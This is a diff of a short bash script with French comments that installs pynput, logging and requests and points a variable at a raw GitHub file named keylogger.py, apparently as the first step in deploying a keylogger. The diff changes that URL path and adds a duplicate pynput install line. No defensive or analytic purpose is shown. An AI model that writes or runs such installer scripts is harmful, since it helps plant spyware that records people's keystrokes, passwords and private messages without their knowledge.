@@ -1,10 +1,14 @@
 #!/bin/bash
+pip install pynput
 pip install logging #installation de la librairie logging
 pip install pynput #installation de la librairie pynput
 pip install requests #installation de la librairie requests
 
+
+
+
 # URL du fichier Python sur GitHub
-GITHUB_URL="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/keylogger.py"
+GITHUB_URL="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/scriptKeylogger/keylogger.py"
 
 # Nom du fichier téléchargé
 FILENAME="keylogger.py"
